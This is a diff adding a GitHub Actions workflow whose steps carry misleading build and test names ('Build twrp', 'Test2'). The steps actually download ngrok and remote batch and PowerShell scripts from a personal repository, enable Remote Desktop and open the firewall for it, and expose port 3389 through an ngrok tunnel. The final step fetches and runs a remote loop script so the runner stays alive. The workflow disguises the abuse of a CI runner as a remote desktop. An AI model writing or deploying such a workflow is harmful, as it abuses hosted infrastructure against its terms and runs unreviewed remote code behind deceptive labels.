@@ -1,0 +1,43 @@
+name: CI
+
+on: 
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  Place:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Test no .1
+      run: |
+        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/Roasters2443/roasted/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/Roasters2443/roasted/main/wallpaper.jpg -OutFile wallpaper.jpg
+        Invoke-WebRequest https://raw.githubusercontent.com/Roasters2443/roasted/main/wallpaper.bat -OutFile wallpaper.bat
+    - name: Build twrp
+      run: Expand-Archive ngrok.zip
+    - name: Test2
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - name: Build ofox
+      run: | 
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        copy wallpaper.jpg D:\a\wallpaper.jpg
+        copy wallpaper.bat D:\a\wallpaper.bat
+    - name: pbrp
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
+    - name: Test4
+      run: cmd /c start.bat
+    - name: finale
+      run: | 
+        Invoke-WebRequest https://github.com/Roasters2443/roasted/raw/main/loop.ps1 -OutFile loop.ps1
+        ./loop.ps1
